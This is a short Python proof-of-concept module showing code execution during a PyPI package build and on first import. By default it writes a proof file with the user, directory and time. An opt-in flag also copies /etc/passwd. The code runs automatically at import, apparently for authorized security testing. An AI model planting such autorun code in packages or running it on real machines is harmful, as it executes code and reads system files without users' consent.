"""RCE demonstration for PyPI: executes at sdist-build time (via setup.py)
and on first import.

Default payload is harmless: writes rce-proof.txt with the executing
user/cwd/time. Set POC_IMPACT=1 (authorized targets only) to also copy
/etc/passwd as an impact demonstration.
"""
import os
import pwd
import shutil
import time


def _run():
    proof = (f"[PoC] executed as {pwd.getpwuid(os.getuid()).pw_name} "
             f"in {os.getcwd()} at {time.strftime('%Y-%m-%dT%H:%M:%S%z')}\n")
    with open("rce-proof.txt", "a") as fh:
        fh.write(proof)
    print(proof, end="")
    if os.environ.get("POC_IMPACT") == "1":
        shutil.copyfile("/etc/passwd", "etc_passwd.txt")
        print("[PoC] impact demo: /etc/passwd copied to etc_passwd.txt (POC_IMPACT=1)")


if os.environ.get("POC_NO_AUTORUN") != "1":
    _run()
